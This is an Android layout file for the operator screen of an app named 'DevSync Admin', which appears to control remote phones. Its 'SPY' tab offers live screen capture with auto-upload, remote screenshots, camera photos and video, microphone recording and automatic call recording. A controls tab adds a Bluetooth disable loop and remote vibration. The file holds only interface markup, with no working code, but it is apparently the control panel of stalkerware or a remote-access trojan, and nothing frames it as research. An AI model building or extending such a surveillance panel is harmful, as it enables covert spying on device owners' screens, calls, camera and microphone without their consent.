<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#0D1117">

    <!-- ── HEADER ── -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="56dp"
        android:orientation="horizontal"
        android:gravity="center_vertical"
        android:paddingHorizontal="16dp"
        android:background="#161B22">

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="⚡ DevSync Admin"
            android:textSize="18sp"
            android:textStyle="bold"
            android:textColor="#FFFFFF" />

        <TextView
            android:id="@+id/tvStatus"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="● ONLINE"
            android:textSize="12sp"
            android:textStyle="bold"
            android:textColor="#00FF88"
            android:background="#1A2A1A"
            android:paddingHorizontal="10dp"
            android:paddingVertical="4dp" />
    </LinearLayout>

    <!-- ── DEVICE BAR ── -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:background="#161B22"
        android:paddingBottom="8dp">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:paddingHorizontal="12dp"
            android:paddingTop="6dp"
            android:gravity="center_vertical">

            <TextView
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="📱 Online Devices"
                android:textSize="13sp"
                android:textStyle="bold"
                android:textColor="#8B949E" />

            <Button
                android:id="@+id/btnSelectAll"
                android:layout_width="wrap_content"
                android:layout_height="28dp"
                android:text="ALL"
                android:textSize="11sp"
                android:textColor="#FFFFFF"
                android:backgroundTint="#21262D"
                android:layout_marginEnd="6dp" />

            <Button
                android:id="@+id/btnDeselectAll"
                android:layout_width="wrap_content"
                android:layout_height="28dp"
                android:text="NONE"
                android:textSize="11sp"
                android:textColor="#FFFFFF"
                android:backgroundTint="#21262D" />
        </LinearLayout>

        <androidx.recyclerview.widget.RecyclerView
            android:id="@+id/rvDevices"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:maxHeight="160dp"
            android:nestedScrollingEnabled="false"
            android:paddingHorizontal="8dp"
            android:paddingTop="4dp" />

        <TextView
            android:id="@+id/tvSelected"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="0 selected"
            android:textSize="11sp"
            android:textColor="#58A6FF"
            android:gravity="center"
            android:paddingTop="4dp" />
    </LinearLayout>

    <!-- ── TAB BAR ── -->
    <HorizontalScrollView
        android:layout_width="match_parent"
        android:layout_height="44dp"
        android:background="#161B22"
        android:scrollbars="none">

        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="match_parent"
            android:orientation="horizontal"
            android:gravity="center_vertical"
            android:paddingHorizontal="8dp">

            <Button android:id="@+id/tabSpy"
                android:layout_width="wrap_content" android:layout_height="32dp"
                android:text="🕵 SPY" android:textSize="11sp"
                android:textColor="#FFFFFF" android:backgroundTint="#238636"
                android:layout_marginEnd="6dp" />

            <Button android:id="@+id/tabMedia"
                android:layout_width="wrap_content" android:layout_height="32dp"
                android:text="🎵 MEDIA" android:textSize="11sp"
                android:textColor="#FFFFFF" android:backgroundTint="#21262D"
                android:layout_marginEnd="6dp" />

            <Button android:id="@+id/tabControls"
                android:layout_width="wrap_content" android:layout_height="32dp"
                android:text="⚙ CONTROLS" android:textSize="11sp"
                android:textColor="#FFFFFF" android:backgroundTint="#21262D"
                android:layout_marginEnd="6dp" />

            <Button android:id="@+id/btnStopAll"
                android:layout_width="wrap_content" android:layout_height="32dp"
                android:text="⛔ STOP ALL" android:textSize="11sp"
                android:textColor="#FFFFFF" android:backgroundTint="#DA3633" />
        </LinearLayout>
    </HorizontalScrollView>

    <!-- ── CONTENT AREA ── -->
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="1"
        android:background="#0D1117">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:padding="12dp">

            <!-- ════════ SPY TAB ════════ -->
            <LinearLayout android:id="@+id/tabSpyContent"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:visibility="visible">

                <!-- Live Screen Capture Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal"
                            android:gravity="center_vertical"
                            android:layout_marginBottom="10dp">

                            <TextView
                                android:layout_width="0dp"
                                android:layout_height="wrap_content"
                                android:layout_weight="1"
                                android:text="🔴 Live Screen Capture"
                                android:textSize="14sp"
                                android:textStyle="bold"
                                android:textColor="#FFFFFF" />

                            <Switch
                                android:id="@+id/switchLiveCapture"
                                android:layout_width="wrap_content"
                                android:layout_height="wrap_content"
                                android:thumbTint="#00FF88"
                                android:trackTint="#1A4A2A" />
                        </LinearLayout>

                        <TextView
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:text="2 screenshots/sec → 30s video auto-upload"
                            android:textSize="11sp"
                            android:textColor="#8B949E"
                            android:layout_marginBottom="8dp" />

                        <TextView android:id="@+id/tvLiveCaptureStatus"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:text="● Stopped"
                            android:textSize="11sp"
                            android:textColor="#8B949E"
                            android:background="#0D1117"
                            android:padding="8dp" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>

                <!-- Single Screenshot Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="📸 Screenshot"
                            android:textSize="14sp"
                            android:textStyle="bold"
                            android:textColor="#FFFFFF"
                            android:layout_marginBottom="10dp" />

                        <Button
                            android:id="@+id/btnTakeScreenshot"
                            android:layout_width="match_parent"
                            android:layout_height="40dp"
                            android:text="TAKE SCREENSHOT"
                            android:textColor="#FFFFFF"
                            android:backgroundTint="#1F6FEB" />

                        <androidx.recyclerview.widget.RecyclerView
                            android:id="@+id/rvScreenshots"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:nestedScrollingEnabled="false"
                            android:layout_marginTop="10dp" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>

                  <!-- Camera Photos Card -->
                  <androidx.cardview.widget.CardView
                      xmlns:app="http://schemas.android.com/apk/res-auto"
                      android:layout_width="match_parent"
                      android:layout_height="wrap_content"
                      android:layout_marginBottom="10dp"
                      app:cardBackgroundColor="#161B22"
                      app:cardCornerRadius="12dp"
                      app:cardElevation="4dp">

                      <LinearLayout
                          android:layout_width="match_parent"
                          android:layout_height="wrap_content"
                          android:orientation="vertical"
                          android:padding="14dp">

                          <TextView
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:text="📸 Camera Photos"
                              android:textSize="14sp"
                              android:textStyle="bold"
                              android:textColor="#FFFFFF"
                              android:layout_marginBottom="8dp" />

                          <androidx.recyclerview.widget.RecyclerView
                              android:id="@+id/rvPhotos"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:nestedScrollingEnabled="false" />
                      </LinearLayout>
                  </androidx.cardview.widget.CardView>

                <!-- Live Videos Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="🎬 Live Screen Videos"
                            android:textSize="14sp"
                            android:textStyle="bold"
                            android:textColor="#FFFFFF"
                            android:layout_marginBottom="10dp" />

                        <androidx.recyclerview.widget.RecyclerView
                            android:id="@+id/rvVideos"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:nestedScrollingEnabled="false" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>

                <!-- Recording Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="🎙️ Microphone Recording"
                            android:textSize="14sp"
                            android:textStyle="bold"
                            android:textColor="#FFFFFF"
                            android:layout_marginBottom="10dp" />

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal"
                            android:gravity="center_vertical"
                            android:layout_marginBottom="8dp">

                            <EditText
                                android:id="@+id/etRecordDuration"
                                android:layout_width="0dp"
                                android:layout_height="40dp"
                                android:layout_weight="1"
                                android:hint="Seconds"
                                android:text="30"
                                android:inputType="number"
                                android:background="#21262D"
                                android:textColor="#FFFFFF"
                                android:textColorHint="#8B949E"
                                android:padding="8dp"
                                android:layout_marginEnd="8dp" />

                            <Button
                                android:id="@+id/btnStartRecording"
                                android:layout_width="wrap_content"
                                android:layout_height="40dp"
                                android:text="▶ START"
                                android:textColor="#FFFFFF"
                                android:backgroundTint="#238636"
                                android:layout_marginEnd="6dp" />

                            <Button
                                android:id="@+id/btnStopRecording"
                                android:layout_width="wrap_content"
                                android:layout_height="40dp"
                                android:text="⏹"
                                android:textColor="#FFFFFF"
                                android:backgroundTint="#DA3633" />
                        </LinearLayout>

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal"
                            android:gravity="center_vertical"
                            android:layout_marginBottom="8dp">

                            <TextView
                                android:layout_width="0dp"
                                android:layout_height="wrap_content"
                                android:layout_weight="1"
                                android:text="📞 Auto Call Recording"
                                android:textSize="13sp"
                                android:textColor="#FFFFFF" />

                            <Switch
                                android:id="@+id/switchCallRecording"
                                android:layout_width="wrap_content"
                                android:layout_height="wrap_content"
                                android:thumbTint="#00FF88"
                                android:trackTint="#1A4A2A" />
                        </LinearLayout>

                        <androidx.recyclerview.widget.RecyclerView
                            android:id="@+id/rvRecordings"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:nestedScrollingEnabled="false" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>
            </LinearLayout>

            <!-- ════════ MEDIA TAB ════════ -->
            <LinearLayout android:id="@+id/tabMediaContent"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:visibility="gone">

                <!-- Songs Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="🎵 Songs Library"
                            android:textSize="14sp"
                            android:textStyle="bold"
                            android:textColor="#FFFFFF"
                            android:layout_marginBottom="10dp" />

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal">

                            <EditText
                                android:id="@+id/etSongUrl"
                                android:layout_width="0dp"
                                android:layout_height="40dp"
                                android:layout_weight="1"
                                android:hint="Paste song URL..."
                                android:inputType="textUri"
                                android:background="#21262D"
                                android:textColor="#FFFFFF"
                                android:textColorHint="#8B949E"
                                android:padding="8dp"
                                android:layout_marginEnd="8dp" />

                            <Button
                                android:id="@+id/btnAddSongUrl"
                                android:layout_width="wrap_content"
                                android:layout_height="40dp"
                                android:text="SAVE"
                                android:textColor="#FFFFFF"
                                android:backgroundTint="#238636" />
                        </LinearLayout>

                        <androidx.recyclerview.widget.RecyclerView
                            android:id="@+id/rvSongs"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:nestedScrollingEnabled="false"
                            android:layout_marginTop="8dp" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>

                <!-- Wallpapers Card -->
                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="🖼️ Wallpapers"
                            android:textSize="14sp"
                            android:textStyle="bold"
                            android:textColor="#FFFFFF"
                            android:layout_marginBottom="10dp" />

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal">

                            <EditText
                                android:id="@+id/etWallpaperUrl"
                                android:layout_width="0dp"
                                android:layout_height="40dp"
                                android:layout_weight="1"
                                android:hint="Paste image URL..."
                                android:inputType="textUri"
                                android:background="#21262D"
                                android:textColor="#FFFFFF"
                                android:textColorHint="#8B949E"
                                android:padding="8dp"
                                android:layout_marginEnd="8dp" />

                            <Button
                                android:id="@+id/btnAddWallpaperUrl"
                                android:layout_width="wrap_content"
                                android:layout_height="40dp"
                                android:text="SAVE"
                                android:textColor="#FFFFFF"
                                android:backgroundTint="#6E40C9" />
                        </LinearLayout>

                        <androidx.recyclerview.widget.RecyclerView
                            android:id="@+id/rvWallpapers"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:nestedScrollingEnabled="false"
                            android:layout_marginTop="8dp" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>
            </LinearLayout>

            <!-- ════════ CONTROLS TAB ════════ -->
            <LinearLayout android:id="@+id/tabControlsContent"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:visibility="gone">

                <androidx.cardview.widget.CardView
                    xmlns:app="http://schemas.android.com/apk/res-auto"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="10dp"
                    app:cardBackgroundColor="#161B22"
                    app:cardCornerRadius="12dp"
                    app:cardElevation="4dp">

                    <LinearLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:orientation="vertical"
                        android:padding="14dp">

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="horizontal"
                            android:gravity="center_vertical"
                            android:paddingVertical="8dp">

                            <TextView
                                android:layout_width="0dp"
                                android:layout_height="wrap_content"
                                android:layout_weight="1"
                                android:text="🔵 Bluetooth Disable Loop"
                                android:textSize="14sp"
                                android:textColor="#FFFFFF" />

                            <Switch
                                android:id="@+id/switchBluetooth"
                                android:layout_width="wrap_content"
                                android:layout_height="wrap_content"
                                android:thumbTint="#58A6FF"
                                android:trackTint="#1A2A4A" />
                        </LinearLayout>

                        <Button
                            android:id="@+id/btnTriggerVibration"
                            android:layout_width="match_parent"
                            android:layout_height="44dp"
                            android:text="📳 TRIGGER VIBRATION"
                            android:textColor="#FFFFFF"
                            android:backgroundTint="#6E40C9"
                            android:layout_marginTop="8dp" />

                        <TextView
                            android:id="@+id/tvFeedback"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:text="Waiting for command..."
                            android:textSize="12sp"
                            android:textColor="#8B949E"
                            android:background="#0D1117"
                            android:padding="10dp"
                            android:layout_marginTop="10dp" />
                    </LinearLayout>
                </androidx.cardview.widget.CardView>
            
                  <!-- Camera Controls Card -->
                  <androidx.cardview.widget.CardView
                      xmlns:app="http://schemas.android.com/apk/res-auto"
                      android:layout_width="match_parent"
                      android:layout_height="wrap_content"
                      android:layout_marginBottom="10dp"
                      app:cardBackgroundColor="#161B22"
                      app:cardCornerRadius="12dp"
                      app:cardElevation="4dp">

                      <LinearLayout
                          android:layout_width="match_parent"
                          android:layout_height="wrap_content"
                          android:orientation="vertical"
                          android:padding="14dp">

                          <TextView
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:text="📸 Camera Control"
                              android:textSize="14sp"
                              android:textStyle="bold"
                              android:textColor="#FFFFFF"
                              android:layout_marginBottom="10dp" />

                          <Button
                              android:id="@+id/btnTakePhoto"
                              android:layout_width="match_parent"
                              android:layout_height="44dp"
                              android:text="📷 TAKE PHOTO"
                              android:textColor="#FFFFFF"
                              android:backgroundTint="#2DA44E"
                              android:layout_marginBottom="8dp" />

                          <Button
                              android:id="@+id/btnStartCameraVideo"
                              android:layout_width="match_parent"
                              android:layout_height="44dp"
                              android:text="🎥 START CAMERA VIDEO"
                              android:textColor="#FFFFFF"
                              android:backgroundTint="#1F6FEB"
                              android:layout_marginBottom="8dp" />

                          <Button
                              android:id="@+id/btnStopCameraVideo"
                              android:layout_width="match_parent"
                              android:layout_height="44dp"
                              android:text="⏹ STOP CAMERA VIDEO"
                              android:textColor="#FFFFFF"
                              android:backgroundTint="#DA3633" />
                      </LinearLayout>
                  </androidx.cardview.widget.CardView>
  </LinearLayout>

        </LinearLayout>
    </ScrollView>
</LinearLayout>
